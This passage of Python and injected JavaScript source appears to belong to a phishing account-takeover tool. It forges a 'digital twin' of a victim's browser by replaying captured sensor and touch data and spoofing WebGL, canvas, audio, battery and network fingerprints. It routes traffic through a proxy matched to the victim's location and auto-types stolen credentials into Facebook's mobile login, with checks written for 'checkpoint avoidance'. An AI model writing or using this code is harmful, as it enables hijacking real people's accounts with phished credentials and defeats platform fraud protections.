                if (!sensorData || !Array.isArray(sensorData) || sensorData.length === 0) {{
                    console.log('[NyxSec] No victim sensor data available, using fallback simulation');
                    startFallbackSensorSimulation();
                    return;
                }}
                
                console.log('[NyxSec] Starting biometric sensor replay with', sensorData.length, 'data points');
                const startTime = Date.now();
                
                sensorData.forEach((sensorPoint, index) => {{
                    const delay = sensorPoint.timestamp - (sensorData[0]?.timestamp || 0);
                    
                    setTimeout(() => {{
                        // Dispatch DeviceOrientationEvent with exact victim data
                        if (sensorPoint.alpha !== undefined || sensorPoint.beta !== undefined || sensorPoint.gamma !== undefined) {{
                            const orientationEvent = new DeviceOrientationEvent('deviceorientation', {{
                                alpha: sensorPoint.alpha || 0,
                                beta: sensorPoint.beta || 0,
                                gamma: sensorPoint.gamma || 0,
                                absolute: true
                            }});
                            window.dispatchEvent(orientationEvent);
                        }}
                        
                        // Dispatch DeviceMotionEvent with exact victim data
                        if (sensorPoint.x !== undefined || sensorPoint.y !== undefined || sensorPoint.z !== undefined) {{
                            const motionEvent = new DeviceMotionEvent('devicemotion', {{
                                acceleration: {{
                                    x: sensorPoint.x || 0,
                                    y: sensorPoint.y || 0,
                                    z: sensorPoint.z || 9.81
                                }},
                                accelerationIncludingGravity: {{
                                    x: sensorPoint.x || 0,
                                    y: sensorPoint.y || 0,
                                    z: sensorPoint.z || 9.81
                                }},
                                rotationRate: {{
                                    alpha: (sensorPoint.alpha || 0) / 100,
                                    beta: (sensorPoint.beta || 0) / 100,
                                    gamma: (sensorPoint.gamma || 0) / 100
                                }},
                                interval: 16 // ~60fps for smooth replay
                            }});
                            window.dispatchEvent(motionEvent);
                        }}
                    }}, delay);
                }});
            }}
            
            // FALLBACK SENSOR SIMULATION (when no victim data available)
            function startFallbackSensorSimulation() {{
                let startTime = Date.now();
                let sensorState = {{
                    gyroscope: {{alpha: 0, beta: 0, gamma: 0}},
                    accelerometer: {{x: 0, y: 0, z: 9.81}},
                    orientation: 'portrait-primary'
                }};
                
                function updateGyroscope() {{
                    const elapsed = (Date.now() - startTime) / 1000;
                    const noise = deviceProfile.sensors?.gyroscopeNoise || 0.1;
                    const drift = deviceProfile.sensors?.gyroscopeDrift || 0.01;
                    
                    sensorState.gyroscope.alpha = (sensorState.gyroscope.alpha + 
                        Math.random() * noise * 2 - noise + drift) % 360;
                    sensorState.gyroscope.beta = Math.max(-180, Math.min(180,
                        sensorState.gyroscope.beta + Math.random() * noise * 2 - noise));
                    sensorState.gyroscope.gamma = Math.max(-90, Math.min(90,
                        sensorState.gyroscope.gamma + Math.random() * noise * 2 - noise));
                    
                    const event = new DeviceOrientationEvent('deviceorientation', {{
                        alpha: sensorState.gyroscope.alpha,
                        beta: sensorState.gyroscope.beta,
                        gamma: sensorState.gyroscope.gamma,
                        absolute: true
                    }});
                    window.dispatchEvent(event);
                }}
                
                function updateAccelerometer() {{
                    const noise = deviceProfile.sensors?.accelerometerNoise || 0.1;
                    const gravity = deviceProfile.sensors?.accelerometerGravity || 9.81;
                    
                    sensorState.accelerometer.x = Math.random() * noise * 2 - noise;
                    sensorState.accelerometer.y = Math.random() * noise * 2 - noise;
                    sensorState.accelerometer.z = gravity + (Math.random() * noise * 2 - noise);
                    
                    const event = new DeviceMotionEvent('devicemotion', {{
                        acceleration: sensorState.accelerometer,
                        accelerationIncludingGravity: {{
                            x: sensorState.accelerometer.x,
                            y: sensorState.accelerometer.y,
                            z: sensorState.accelerometer.z
                        }},
                        rotationRate: {{
                            alpha: sensorState.gyroscope.alpha / 100,
                            beta: sensorState.gyroscope.beta / 100,
                            gamma: sensorState.gyroscope.gamma / 100
                        }},
                        interval: 1000 / (deviceProfile.sensors?.accelerometerFrequency || 60)
                    }});
                    window.dispatchEvent(event);
                }}
                
                // Start fallback simulation
                setInterval(updateGyroscope, 1000 / (deviceProfile.sensors?.gyroscopeFrequency || 60));
                setInterval(updateAccelerometer, 1000 / (deviceProfile.sensors?.accelerometerFrequency || 60));
            }}
            
            // BIOMETRIC TOUCH REPLAY FUNCTION
            function replayTouchSequence(touchData, targetElement) {{
                // Ensure touchData is an array
                if (!touchData || !Array.isArray(touchData) || touchData.length === 0) {{
                    console.log('[NyxSec] No victim touch data available, using fallback');
                    return false;
                }}
                
                console.log('[NyxSec] Starting biometric touch replay with', touchData.length, 'touch events');
                
                touchData.forEach((touchPoint, index) => {{
                    const delay = touchPoint.timestamp - (touchData[0]?.timestamp || 0);
                    
                    setTimeout(() => {{
                        const touch = {{
                            identifier: touchPoint.identifier || Math.random().toString(36).substr(2, 9),
                            target: targetElement || document.elementFromPoint(touchPoint.clientX, touchPoint.clientY) || document.body,
                            clientX: touchPoint.clientX,
                            clientY: touchPoint.clientY,
                            screenX: touchPoint.screenX || touchPoint.clientX,
                            screenY: touchPoint.screenY || touchPoint.clientY,
                            pageX: touchPoint.pageX || touchPoint.clientX,
                            pageY: touchPoint.pageY || touchPoint.clientY,
                            force: touchPoint.force || 1.0,
                            radiusX: touchPoint.radiusX || 10,
                            radiusY: touchPoint.radiusY || 10
                        }};
                        
                        const event = new TouchEvent(touchPoint.type || 'touchstart', {{
                            touches: [touch],
                            targetTouches: [touch],
                            changedTouches: [touch],
                            bubbles: true,
                            cancelable: true
                        }});
                        
                        if (targetElement) {{
                            targetElement.dispatchEvent(event);
                        }} else {{
                            document.elementFromPoint(touchPoint.clientX, touchPoint.clientY)?.dispatchEvent(event);
                        }}
                    }}, delay);
                }});
                
                return true;
            }}
            
            // EXPOSE REPLAY FUNCTIONS GLOBALLY
            window.replaySensorStream = replaySensorStream;
            window.replayTouchSequence = replayTouchSequence;
            
            // START BIOMETRIC REPLAY
            replaySensorStream(victimSensors);
            
            // REALISTIC TOUCH EVENT SPOOFING
            function createRealisticTouchEvent(type, x, y) {{
                const pressureRange = deviceProfile.touch.pressureRange;
                const sizeRange = deviceProfile.touch.sizeRange;
                
                const touch = {{
                    identifier: Math.random().toString(36).substr(2, 9),
                    target: document.elementFromPoint(x, y) || document.body,
                    clientX: x,
                    clientY: y,
                    screenX: x,
                    screenY: y,
                    pageX: x,
                    pageY: y,
                    force: Math.random() * (pressureRange[1] - pressureRange[0]) + pressureRange[0],
                    radiusX: Math.random() * (sizeRange[1] - sizeRange[0]) + sizeRange[0],
                    radiusY: Math.random() * (sizeRange[1] - sizeRange[0]) + sizeRange[0]
                }};
                
                const event = new TouchEvent(type, {{
                    touches: [touch],
                    targetTouches: [touch],
                    changedTouches: [touch],
                    bubbles: true,
                    cancelable: true
                }});
                
                return event;
            }}
            
            // REALISTIC BATTERY SIMULATION
            let batteryLevel = deviceProfile.battery.initialLevel;
            let batteryCharging = false;
            let batteryDrainRate = deviceProfile.battery.drainRate;
            
            setInterval(() => {{
                if (batteryCharging) {{
                    batteryLevel += batteryDrainRate * 5;
                    batteryLevel = Math.min(1.0, batteryLevel);
                }} else {{
                    batteryLevel -= batteryDrainRate;
                    batteryLevel = Math.max(0, batteryLevel);
                }}
            }}, 1000);
            
            // Override Battery API
            if (navigator.getBattery) {{
                navigator.getBattery = () => Promise.resolve({{
                    level: batteryLevel,
                    charging: batteryCharging,
                    chargingTime: batteryCharging ? 3600 : Infinity,
                    dischargingTime: batteryCharging ? Infinity : 3600
                }});
            }}
            
            // REALISTIC SCREEN ORIENTATION SPOOFING
            if (screen.orientation) {{
                Object.defineProperty(screen.orientation, 'type', {{
                    get: () => deviceProfile.orientation || 'portrait-primary',
                    configurable: false
                }});
                Object.defineProperty(screen.orientation, 'angle', {{
                    get: () => deviceProfile.orientation === 'landscape-primary' ? 90 : 0,
                    configurable: false
                }});
            }}
            
            // REALISTIC NETWORK CONNECTION SPOOFING
            if (navigator.connection) {{
                Object.defineProperty(navigator.connection, 'effectiveType', {{
                    get: () => deviceProfile.network.effectiveType || '4g',
                    configurable: false
                }});
                Object.defineProperty(navigator.connection, 'downlink', {{
                    get: () => deviceProfile.network.downlink || 25,
                    configurable: false
                }});
                Object.defineProperty(navigator.connection, 'rtt', {{
                    get: () => deviceProfile.network.rtt || 50,
                    configurable: false
                }});
                Object.defineProperty(navigator.connection, 'saveData', {{
                    get: () => deviceProfile.network.saveData || false,
                    configurable: false
                }});
            }}
            
            console.log('[NyxSec] Realistic mobile sensors active:', deviceProfile.deviceModel);
        }})();
        
        // NEW: WebGL Fingerprinting (COMPLETE with unmasked parameters)
        const originalGetParameter = WebGLRenderingContext.prototype.getParameter;
        WebGLRenderingContext.prototype.getParameter = function(param) {{
            // VENDOR (37445)
            if (param === 37445) return '{fp.get('webGLVendor', 'Google Inc. (Intel)')}';
            // RENDERER (37446)
            if (param === 37446) return '{fp.get('webGLRenderer', 'ANGLE (Intel)')}';
            // UNMASKED_VENDOR_WEBGL (37447)
            if (param === 37447) return '{webgl_unmasked_vendor}';
            // UNMASKED_RENDERER_WEBGL (37448)
            if (param === 37448) return '{webgl_unmasked_renderer}';
            return originalGetParameter.call(this, param);
        }};
        
        // NEW: Canvas Fingerprinting (FIXED - validates data)
        const originalToDataURL = HTMLCanvasElement.prototype.toDataURL;
        HTMLCanvasElement.prototype.toDataURL = function() {{
            const fingerprint = '{fp.get('canvasFingerprint', '')}';
            
            // Validate fingerprint is valid base64 PNG
            if (fingerprint && fingerprint.startsWith('data:image/png;base64,')) {{
                try {{
                    // Validate base64 is decodable
                    const base64Data = fingerprint.split(',')[1];
                    atob(base64Data); // Throws if invalid base64
                    return fingerprint; // Return valid fingerprint
                }} catch (e) {{
                    // Invalid base64, fall back to original
                    console.warn('[NyxSec] Invalid canvas fingerprint, using original');
                    return originalToDataURL.apply(this, arguments);
                }}
            }}
            
            // No fingerprint or invalid format, use original
            return originalToDataURL.apply(this, arguments);
        }};
        
        // NEW: Audio Fingerprinting (preserve victim's signature)
        const originalGetChannelData = AudioBuffer.prototype.getChannelData;
        let audioHash = '{fp.get('audioFingerprint', '12345')}';
        AudioBuffer.prototype.getChannelData = function(channel) {{
            const original = originalGetChannelData.call(this, channel);
            const consistentData = new Float32Array(original.length);
            for (let i = 0; i < original.length; i++) {{
                consistentData[i] = (parseInt(audioHash) % 1000) / 10000 + (i % 100) / 100000;
            }}
            return consistentData;
        }};
    """
    
    # --- AUTOMATED DEVTOOLS & DEVICE EMULATION SETUP ---
    # Step 1: Enable required CDP domains
    # Note: Emulation.enable is deprecated in Chrome 142+, not needed
    try:
        driver.execute_cdp_cmd('Page.enable', {})
        driver.execute_cdp_cmd('Runtime.enable', {})
        driver.execute_cdp_cmd('Network.enable', {})
        # Emulation.enable is deprecated in newer Chrome versions - skip it
        print("[INFO] CDP domains enabled for device emulation")
    except Exception as e:
        handle_cdp_error("CDP domain enablement", e, raise_on_critical=False)
    
    # Step 2: Set device metrics FIRST (this automatically enables device toolbar in DevTools)
    # This must be done before any page loads to ensure proper mobile view
    try:
        device_metrics = {
            'width': width,
            'height': height,
            'deviceScaleFactor': fp.get('devicePixelRatio', 3),
            'mobile': True  # This flag automatically toggles device toolbar in DevTools
        }
        driver.execute_cdp_cmd('Emulation.setDeviceMetricsOverride', device_metrics)
        print(f"[INFO] Device metrics set: {width}x{height} @ {device_metrics['deviceScaleFactor']}x (Mobile mode)")
    except Exception as e:
        print(f"[ERROR] Failed to set device metrics: {e}")
        raise
    
    # Step 3: Override user agent (must match device metrics)
    try:
        driver.execute_cdp_cmd('Network.setUserAgentOverride', {'userAgent': user_agent})
        print(f"[INFO] User agent overridden: {user_agent[:50]}...")
    except Exception as e:
        handle_cdp_error("User agent override", e, raise_on_critical=False)
    
    # Step 4: Enable touch emulation (required for mobile device toolbar)
    try:
        driver.execute_cdp_cmd('Emulation.setTouchEmulationEnabled', {
            'enabled': True,
            'maxTouchPoints': fp.get('touchSupport', 1)
        })
        print(f"[INFO] Touch emulation enabled: {fp.get('touchSupport', 1)} touch points")
    except Exception as e:
        handle_cdp_error("Touch emulation", e, raise_on_critical=False)
    
    # Step 5: Inject fingerprint overrides BEFORE any page loads
    # This ensures all fingerprint properties are set from the start
    try:
        driver.execute_cdp_cmd('Page.addScriptToEvaluateOnNewDocument', {'source': js_override_script})
        print("[INFO] Fingerprint injection script registered (will apply to all pages)")
    except Exception as e:
        print(f"[ERROR] Failed to inject fingerprint script: {e}")
        raise
    
    # Step 6: Set CPU throttling to match device performance
    try:
        driver.execute_cdp_cmd('Emulation.setCPUThrottlingRate', {
            'rate': 1  # Normal speed (1 = no throttling)
        })
        print("[INFO] CPU throttling set to normal speed")
    except Exception as e:
        handle_cdp_error("CPU throttling", e, raise_on_critical=False)
    
    # Step 7: Set network conditions to match victim's connection
    try:
        connection_downlink = fp.get('connectionDownlink', 10)
        network_conditions = {
            'offline': False,
            'downloadThroughput': connection_downlink * 1024 * 1024 / 8,  # Convert Mbps to bytes/sec
            'uploadThroughput': connection_downlink * 1024 * 1024 / 8,
            'latency': 50
        }
        driver.execute_cdp_cmd('Network.emulateNetworkConditions', network_conditions)
        print(f"[INFO] Network conditions emulated: {connection_downlink} Mbps downlink")
    except Exception as e:
        handle_cdp_error("Network conditions emulation", e, raise_on_critical=False)
    
    # Step 8: Additional JavaScript injection to ensure device toolbar stays active
    # This script runs on every page load to maintain device emulation state
    device_toolbar_script = """
        // INJECTION GUARD
        if (window.__NyxSecDeviceToolbarInjected) {{
            return;
        }}
        window.__NyxSecDeviceToolbarInjected = true;
        
        // Ensure device emulation state is maintained
        if (window.outerWidth !== window.innerWidth || window.outerHeight !== window.innerHeight) {
            // Device toolbar is active
            console.log('[NyxSec] Device emulation mode active');
        }
        // Force mobile viewport meta tag if not present
        if (document.head && !document.querySelector('meta[name="viewport"]')) {
            const viewport = document.createElement('meta');
            viewport.name = 'viewport';
            viewport.content = 'width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no';
            document.head.appendChild(viewport);
        } else if (!document.head) {
            // Wait for DOM to be ready
            if (document.readyState === 'loading') {
                document.addEventListener('DOMContentLoaded', function() {
                    if (document.head && !document.querySelector('meta[name="viewport"]')) {
                        const viewport = document.createElement('meta');
                        viewport.name = 'viewport';
                        viewport.content = 'width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no';
                        document.head.appendChild(viewport);
                    }
                });
            }
        }
    """
    try:
        driver.execute_cdp_cmd('Page.addScriptToEvaluateOnNewDocument', {'source': device_toolbar_script})
        print("[INFO] Device toolbar maintenance script registered")
    except Exception as e:
        handle_cdp_error("Device toolbar script injection", e, raise_on_critical=False)
    
    # Step 9: Verify device emulation is active
    try:
        # Get current window size to verify
        window_size = driver.get_window_size()
        print(f"[INFO] Browser window size: {window_size['width']}x{window_size['height']}")
        
        # Note: Emulation.getDeviceMetricsOverride is deprecated in Chrome 142+
        # Device metrics are already set, verification is optional
        print(f"[INFO] Device emulation active: {width}x{height} (Mobile mode)")
    except Exception as e:
        print(f"[WARNING] Could not verify device emulation: {e}")
    
    print("\n" + "="*60)
    print("[SUCCESS] Browser identity forged. Digital Twin is online.")
    print("[SUCCESS] DevTools opened with device toolbar enabled")
    print("[SUCCESS] All fingerprint parameters applied and preserved")
    print(f"[INFO] Resolution: {width}x{height} @ {fp.get('devicePixelRatio', 3)}x")
    print(f"[INFO] Platform: {platform} | Touch Points: {fp.get('touchSupport', 1)}")
    print("="*60 + "\n")
    
    # Apply behavioral layer if data available
    behavioral_data = profile_data.get('behavior', {})
    behavioral_phase = profile_data.get('_behavioral_phase', profile_data.get('behavioral_phase', 1))  # Default Phase 1
    
    apply_behavioral_layer(driver, behavioral_data, phase=behavioral_phase)
    
    return driver

def verify_proxy_ip_matches_victim(driver, victim_ip, victim_location, max_attempts=PROXY_VERIFICATION_MAX_ATTEMPTS):
    """
    Verify proxy IP matches victim location.
    Works with both Selenium and Camoufox drivers.
    Compares location (country/region) instead of exact IP address.
    """
    # Check if driver is CamoufoxDriver (has 'page' attribute)
    is_camoufox = hasattr(driver, 'page') and driver.page is not None
    print(f"[INFO] Verifying proxy location matches victim location: {victim_location}")
    
    for attempt in range(max_attempts):
        try:
            # Check current IP through proxy using multiple endpoints
            proxy_ip = _get_proxy_ip_via_driver(driver)

            if not proxy_ip:
                raise ValueError("No IP found in response")
            
            print(f"[ATTEMPT {attempt + 1}] Proxy IP detected: {proxy_ip}")
            
            # Get location of proxy IP
            try:
                response = requests.get(f'http://ip-api.com/json/{proxy_ip}', timeout=5)
                proxy_location = response.json()
                
                if proxy_location.get('status') == 'success':
                    # Compare locations instead of IPs
                    victim_country = victim_location.get('country')
                    proxy_country = proxy_location.get('countryCode')
                    
                    print(f"[INFO] Location comparison: Victim={victim_country}, Proxy={proxy_country}")
                    
                    if proxy_country == victim_country:
                        print(f"[SUCCESS] Proxy location matches victim location: {proxy_country}")
                        return True
                    else:
                        print(f"[WARNING] Different countries: Proxy={proxy_country}, Victim={victim_country}")
                        
                        # Check if it's in the same region (fallback)
                        victim_region = victim_location.get('region', '').lower()
                        proxy_region = proxy_location.get('regionName', '').lower()
                        
                        if victim_region and proxy_region and victim_region in proxy_region:
                            print(f"[INFO] Same region detected: {proxy_region} - Acceptable")
                            return True
                else:
                    print(f"[ERROR] Failed to get proxy location data")
                    
            except Exception as e:
                print(f"[ERROR] Location check failed: {e}")
                
        except Exception as e:
            print(f"[ERROR] Attempt {attempt + 1} failed: {e}")
            
        if attempt < max_attempts - 1:
            print(f"[INFO] Retrying in {PROXY_RETRY_DELAY} seconds...")
            time.sleep(PROXY_RETRY_DELAY)
    
    print(f"[WARNING] Could not match victim location after {max_attempts} attempts")
    return False
    
def update_session_status(profile_data, status, details=None):
    """Update the takeover status in sessions.json"""
    try:
        session_id = profile_data.get('fingerprint', {}).get('sessionId', 'unknown_session')
        # Use environment variable or default path
        sessions_file = os.getenv('MAXPHISHER_SESSIONS_FILE', os.path.expanduser('~/.site/sessions.json'))
        
        # Load existing sessions
        sessions = []
        if os.path.exists(sessions_file):
            with open(sessions_file, 'r') as f:
                sessions = json.load(f)
        
        # Find and update the session
        for session in sessions:
            if session.get('sessionId') == session_id:
                session['takeoverStatus'] = status
                if details:
                    session['takeoverDetails'] = details
                session['lastTakeoverAttempt'] = datetime.now().isoformat()
                break
        
        # Save updated sessions
        with open(sessions_file, 'w') as f:
            json.dump(sessions, f, indent=2)
        
        print(f"[INFO] Updated session {session_id} status: {status}")
        
    except Exception as e:
        print(f"[WARNING] Failed to update session status: {e}")

def human_type(element, text):
    """Type text character by character with human-like delays."""
    for char in text:
        element.send_keys(char)
        time.sleep(random.uniform(HUMAN_TYPE_DELAY_MIN, HUMAN_TYPE_DELAY_MAX))


def auto_type_login_credentials(driver, username, password):
    if not username or not password:
        return

    try:
        wait = WebDriverWait(driver, ELEMENT_WAIT_TIMEOUT)

        email_input = None
        email_locators = [
            (By.NAME, "email"),
            (By.ID, "m_login_email"),
            (By.CSS_SELECTOR, "input[type='email']"),
            (By.CSS_SELECTOR, "input[type='text']"),
        ]
        for locator in email_locators:
            try:
                email_input = wait.until(EC.presence_of_element_located(locator))
                break
            except Exception:
                continue

        if not email_input:
            print("[WARNING] Could not locate email/phone input for auto-typing.")
            return

        password_input = None
        password_locators = [
            (By.NAME, "pass"),
            (By.ID, "m_login_password"),
            (By.CSS_SELECTOR, "input[type='password']"),
        ]
        for locator in password_locators:
            try:
                password_input = wait.until(EC.presence_of_element_located(locator))
                break
            except Exception:
                continue

        if not password_input:
            print("[WARNING] Could not locate password input for auto-typing.")
            return

        print("[INFO] Auto-typing username/phone into login form...")
        human_type(email_input, username)
        time.sleep(random.uniform(FIELD_DELAY_MIN, FIELD_DELAY_MAX))

        print("[INFO] Auto-typing password into login form...")
        human_type(password_input, password)
        time.sleep(random.uniform(FIELD_DELAY_MIN, FIELD_DELAY_MAX))

    except Exception as e:
        print(f"[WARNING] Auto-typing login credentials failed: {e}")

def auto_enable_and_click_login_button(driver, timeout=15):
    """
    Automatically find and click the mobile Facebook login button.
    Uses multiple selectors to find the button, including the exact mobile button format.
    """
    try:
        wait = WebDriverWait(driver, timeout)
        
        # Mobile Facebook login button selectors (priority order)
        selectors = [
            'button[name="login"][value="Log in"]',  # Exact mobile button match
            'button[name="login"]',                   # Name only
            'button[data-sigil*="m_login_button"]',   # Data sigil
            'button[type="submit"]',                 # Generic submit
            'button[data-testid="royal_login_button"]',  # Desktop fallback
            'button[aria-label="Log in"]',            # Aria label
            'button[aria-label="Log In"]',            # Aria label variant
        ]
        
        button = None
        for sel in selectors:
            try:
                button = wait.until(
                    EC.element_to_be_clickable((By.CSS_SELECTOR, sel))
                )
                if button and button.is_displayed():
                    print(f"[INFO] Found login button with selector: {sel}")
                    break
            except Exception:
                continue
        
        if not button:
            print("[WARNING] Login button not found with any selector")
            return False
        
        # Use JavaScript to click (more reliable for mobile Facebook)
        try:
            driver.execute_script(
                """
                (function() {
                    const btn = arguments[0];
                    if (!btn) return false;
                    
                    // Remove disabled states
                    btn.disabled = false;
                    btn.removeAttribute('disabled');
                    btn.removeAttribute('aria-disabled');
                    btn.classList.remove('disabled');
                    
                    // Scroll into view
                    btn.scrollIntoView({ behavior: 'smooth', block: 'center' });
                    
                    // Wait a bit then click
                    setTimeout(function() {
                        btn.click();
                    }, 300);
                    
                    return true;
                })();
                """,
                button
            )
            print("[SUCCESS] Login button clicked via JavaScript")
            return True
        except Exception as js_error:
            print(f"[WARNING] JavaScript click failed: {js_error}, trying Selenium click...")
            # Fallback to Selenium click
            button.click()
            print("[SUCCESS] Login button clicked via Selenium")
            return True
            
    except Exception as e:
        print(f"[WARNING] Auto-clicking login button failed: {e}")
        return False

def validate_strict_fingerprint(fp: dict):
    """
    Validate fingerprint has all required fields for strict mode.
    Raises ValueError if any required field is missing.
    
    Args:
        fp: Fingerprint dictionary to validate
    
    Raises:
        ValueError: If any required field is missing
    """
    required_keys = [
        # Identity
        "userAgent", "platform", "language", "languages",
        # Screen/device
        "screenResolution", "devicePixelRatio", "hardwareConcurrency", 
        "deviceMemory", "maxTouchPoints",
        # Time/locale
        "timezone",
        # Graphics
        "webGLVendor", "webGLRenderer", "webGLUnmaskedVendor", 
        "webGLUnmaskedRenderer", "canvasFingerprint", "audioFingerprint",
        # Sensors
        "gyroscopeNoise", "gyroscopeDrift", "gyroscopeFrequency",
        "accelerometerNoise", "accelerometerGravity", "accelerometerFrequency",
        "touchPressureRange", "touchSizeRange",
        # Storage/privacy
        "cookieEnabled", "localStorage", "sessionStorage", "indexedDB", "doNotTrack",
        # Network
        "connectionType", "connectionDownlink", "saveData",
    ]
    missing = [k for k in required_keys if k not in fp]
    if missing:
        raise ValueError(f"Strict fingerprint missing fields: {', '.join(missing)}")


def validate_fingerprint_completeness(fp: dict, strict_mode: bool = False):
    """
    Validate fingerprint has all critical Facebook fields.
    Implements graceful degradation: if critical fields missing, returns missing fields list.
    
    Args:
        fp: Fingerprint dictionary to validate
        strict_mode: If True, raise ValueError on missing critical fields
    
    Returns:
        tuple: (is_complete: bool, missing_critical: list, missing_optional: list)
    
    Raises:
        ValueError: If strict_mode=True and critical fields are missing
    """
    # Critical fields for Facebook mobile checkpoint avoidance
    critical_fields = [
        'userAgent', 'platform', 'screenResolution', 'devicePixelRatio',
        'webGLUnmaskedVendor', 'webGLUnmaskedRenderer',  # CRITICAL for detection
        'canvasFingerprint', 'audioFingerprint',
        'hardwareConcurrency', 'deviceMemory', 'timezone'
    ]
    
    # Optional but recommended fields
    optional_fields = [
        'webGLVendor', 'webGLRenderer', 'language', 'languages',
        'batteryLevel', 'connectionType', 'connectionDownlink'
    ]
    
    missing_critical = [field for field in critical_fields if field not in fp or not fp[field]]
    missing_optional = [field for field in optional_fields if field not in fp or not fp[field]]
    
    if missing_critical and strict_mode:
        raise ValueError(
            f"Critical fingerprint fields missing: {', '.join(missing_critical)}. "
            f"These fields are required for Facebook mobile checkpoint avoidance."
        )
    
    is_complete = len(missing_critical) == 0
    
    if missing_critical:
        print(f"[WARNING] Missing critical fingerprint fields: {', '.join(missing_critical)}")
    if missing_optional:
        print(f"[INFO] Missing optional fingerprint fields: {', '.join(missing_optional)}")
    
    return is_complete, missing_critical, missing_optional


def validate_webgl_consistency(fp: dict):
    """
    Validate WebGL unmasked parameters match device type.
    Android devices must have Qualcomm/Adreno GPU, not Intel/NVIDIA.
    
    Args:
        fp: Fingerprint dictionary to validate
    
    Raises:
        ValueError: If WebGL parameters don't match device type
    """
    ua = fp.get('userAgent', '')
    platform = fp.get('platform', '')
    webgl_vendor = fp.get('webGLUnmaskedVendor', '')
    webgl_renderer = fp.get('webGLUnmaskedRenderer', '')
    
    if not webgl_vendor or not webgl_renderer:
        print("[WARNING] WebGL unmasked parameters missing - cannot validate consistency")
        return
    
    # Android device validation
    is_android = 'Android' in ua or 'armv' in platform.lower() or 'Linux' in platform
    
    if is_android:
        # Android devices should have Qualcomm/Adreno or ARM Mali GPU
        if 'Intel' in webgl_vendor or 'NVIDIA' in webgl_vendor or 'AMD' in webgl_vendor:
            raise ValueError(
                f"WebGL consistency error: Android device cannot have Intel/NVIDIA/AMD GPU. "
                f"Device: {ua[:50]}..., Platform: {platform}, "
                f"WebGL Vendor: {webgl_vendor}, Renderer: {webgl_renderer}. "
                f"Expected Qualcomm/Adreno or ARM Mali for Android devices."
            )
        if 'Qualcomm' not in webgl_vendor and 'Adreno' not in webgl_renderer and 'Mali' not in webgl_renderer:
            print(
                f"[WARNING] Android device with unusual GPU: {webgl_vendor}/{webgl_renderer}. "
                f"Expected Qualcomm/Adreno or ARM Mali."
            )
    
    # iOS device validation
    is_ios = 'iPhone' in ua or 'iPad' in ua or 'iOS' in ua
    
    if is_ios:
        if 'Apple' not in webgl_vendor and 'Apple' not in webgl_renderer:
            raise ValueError(
                f"WebGL consistency error: iOS device must have Apple GPU. "
                f"Device: {ua[:50]}..., WebGL Vendor: {webgl_vendor}, Renderer: {webgl_renderer}."
            )
    
    # Desktop validation (Windows/Mac/Linux desktop)
    is_desktop = ('Windows' in ua or 'Macintosh' in ua or 'X11' in ua) and not is_android and not is_ios
    
    if is_desktop:
        # Desktop can have Intel/NVIDIA/AMD
        if 'Qualcomm' in webgl_vendor or 'Adreno' in webgl_renderer:
            print(
                f"[WARNING] Desktop device with mobile GPU: {webgl_vendor}/{webgl_renderer}. "
                f"Expected Intel/NVIDIA/AMD for desktop."
            )
    
    print(f"[SUCCESS] WebGL consistency validated: {webgl_vendor}/{webgl_renderer} matches device type")


def validate_geolocation_consistency(fp: dict, proxy_string: str = None, location_data: dict = None):
    """
    Validate timezone matches proxy geolocation.
    Auto-adjusts timezone based on proxy location if mismatch detected.
    
    Args:
        fp: Fingerprint dictionary (will be modified if timezone adjusted)
        proxy_string: Proxy string (e.g., socks5://user:pass@host:port)
        location_data: Location dictionary with country/region info
    
    Returns:
        bool: True if consistent or adjusted, False if inconsistency detected but couldn't fix
    """
    timezone = fp.get('timezone', '')
    
    if not timezone:
        print("[WARNING] Timezone not set in fingerprint")
        return False
    
    # Extract country from location data if available
    country = None
    if location_data:
        country = location_data.get('country') or location_data.get('countryCode')
    
    # Extract country from proxy if available
    if not country and proxy_string:
        # Try to extract country from proxy hostname or DataImpulse format
        # DataImpulse format: socks5://base_user-country-us-state-california-city-losangeles:key@gateway
        if 'country-' in proxy_string:
            country_match = re.search(r'country-([a-z]{2})', proxy_string.lower())
            if country_match:
                country = country_match.group(1).upper()
    
    if not country:
        print("[INFO] Could not determine country from proxy/location - skipping geolocation validation")
        return True  # Can't validate, but not an error
    
    # Country to timezone mapping (common ones)
    country_timezone_map = {
        'PH': 'Asia/Manila', 'US': 'America/New_York', 'GB': 'Europe/London',
        'CA': 'America/Toronto', 'AU': 'Australia/Sydney', 'DE': 'Europe/Berlin',
        'FR': 'Europe/Paris', 'JP': 'Asia/Tokyo', 'KR': 'Asia/Seoul',
        'CN': 'Asia/Shanghai', 'IN': 'Asia/Kolkata', 'BR': 'America/Sao_Paulo',
        'MX': 'America/Mexico_City', 'ES': 'Europe/Madrid', 'IT': 'Europe/Rome',
        'NL': 'Europe/Amsterdam', 'SE': 'Europe/Stockholm', 'NO': 'Europe/Oslo',
        'DK': 'Europe/Copenhagen', 'FI': 'Europe/Helsinki', 'PL': 'Europe/Warsaw',
        'TR': 'Europe/Istanbul', 'SA': 'Asia/Riyadh', 'AE': 'Asia/Dubai',
        'SG': 'Asia/Singapore', 'MY': 'Asia/Kuala_Lumpur', 'TH': 'Asia/Bangkok',
        'ID': 'Asia/Jakarta', 'VN': 'Asia/Ho_Chi_Minh'
    }
    
    expected_timezone = country_timezone_map.get(country.upper())
    
    if not expected_timezone:
        print(f"[INFO] No timezone mapping for country {country} - skipping validation")
        return True
    
    if timezone != expected_timezone:
        print(
            f"[WARNING] Timezone mismatch detected: fingerprint timezone '{timezone}' "
            f"does not match proxy country '{country}' (expected '{expected_timezone}'). "
            f"Auto-adjusting timezone..."
        )
        fp['timezone'] = expected_timezone
        print(f"[INFO] Timezone adjusted to: {expected_timezone}")
        return True
    
    print(f"[SUCCESS] Geolocation consistency validated: timezone '{timezone}' matches country '{country}'")
    return True


def enrich_victim_profile(profile_data, strict_fingerprint=False, proxy_string=None):
    """
    Enrich victim profile by adding missing fields with appropriate defaults.
    This ensures the profile has all required fields even if some are missing.
    
    Args:
        profile_data: Dictionary containing victim profile data
        strict_fingerprint: If True, skip default-filling for fingerprint fields
                           and validate that all required fields are present
        proxy_string: Proxy string for geolocation consistency checking
    
    Returns:
        Enriched profile_data with all missing fields added (unless strict_fingerprint=True)
    """
    if strict_fingerprint:
        print("[INFO] Strict fingerprint mode enabled - validating required fields (no defaults will be added)...")
    else:
        print("[INFO] Enriching victim profile - adding missing fields with defaults...")
    
    # Ensure fingerprint exists
    if 'fingerprint' not in profile_data:
        if strict_fingerprint:
            raise ValueError("Strict fingerprint mode requires 'fingerprint' key in profile data")
